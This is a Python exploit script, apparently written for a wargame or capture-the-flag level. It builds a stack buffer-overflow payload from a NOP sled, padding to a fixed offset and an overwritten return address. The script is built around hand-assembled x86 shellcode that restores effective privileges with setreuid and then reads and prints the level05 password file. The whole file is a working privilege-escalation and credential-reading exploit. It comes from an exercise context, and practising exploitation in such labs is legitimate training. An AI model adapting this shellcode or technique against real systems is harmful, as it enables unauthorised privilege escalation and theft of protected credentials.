#!/usr/bin/env python
from __future__ import print_function

import struct
import sys

OFFSET = 156

# We may need to adjust this address in our VM.
# It must point inside the NOP sled on the stack.
RET_ADDR = 0xffffd6a0

if len(sys.argv) > 1:
    RET_ADDR = int(sys.argv[1], 0)

# This shellcode does NOT call execve().
# It directly opens, reads, and writes /home/users/level05/.pass.
shellcode = (
    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x31"              # mov al, 0x31        ; geteuid
    b"\xcd\x80"              # int 0x80
    b"\x89\xc3"              # mov ebx, eax
    b"\x89\xc1"              # mov ecx, eax
    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x46"              # mov al, 0x46        ; setreuid
    b"\xcd\x80"              # int 0x80

    b"\xeb\x30"              # jmp short get_path

    # open_file:
    b"\x5b"                  # pop ebx             ; ebx = path
    b"\x31\xc9"              # xor ecx, ecx        ; O_RDONLY
    b"\x31\xd2"              # xor edx, edx
    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x05"              # mov al, 5           ; open
    b"\xcd\x80"              # int 0x80

    b"\x89\xc3"              # mov ebx, eax        ; fd
    b"\x83\xec\x40"          # sub esp, 0x40       ; buffer
    b"\x89\xe1"              # mov ecx, esp
    b"\x31\xd2"              # xor edx, edx
    b"\xb2\x40"              # mov dl, 0x40        ; read 64 bytes
    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x03"              # mov al, 3           ; read
    b"\xcd\x80"              # int 0x80

    b"\x89\xc2"              # mov edx, eax        ; bytes read
    b"\x31\xdb"              # xor ebx, ebx
    b"\x43"                  # inc ebx             ; stdout = 1
    b"\x89\xe1"              # mov ecx, esp
    b"\x31\xc0"              # xor eax, eax
    b"\xb0\x04"              # mov al, 4           ; write
    b"\xcd\x80"              # int 0x80

    b"\x31\xdb"              # xor ebx, ebx
    b"\x31\xc0"              # xor eax, eax
    b"\x40"                  # inc eax             ; exit
    b"\xcd\x80"              # int 0x80

    # get_path:
    b"\xe8\xcb\xff\xff\xff"  # call open_file
    b"/home/users/level05/.pass\x00"
)

payload = b"\x90" * 24
payload += shellcode

if len(payload) > OFFSET:
    print("[!] Payload too long: %d > %d" % (len(payload), OFFSET), file=sys.stderr)
    sys.exit(1)

payload += b"A" * (OFFSET - len(payload))
payload += struct.pack("<I", RET_ADDR)
payload += b"\n"

print("[+] OFFSET   = %d" % OFFSET, file=sys.stderr)
print("[+] RET_ADDR = %#x" % RET_ADDR, file=sys.stderr)
print("[+] Shellcode length = %d" % len(shellcode), file=sys.stderr)

try:
    sys.stdout.buffer.write(payload)
except AttributeError:
    sys.stdout.write(payload)
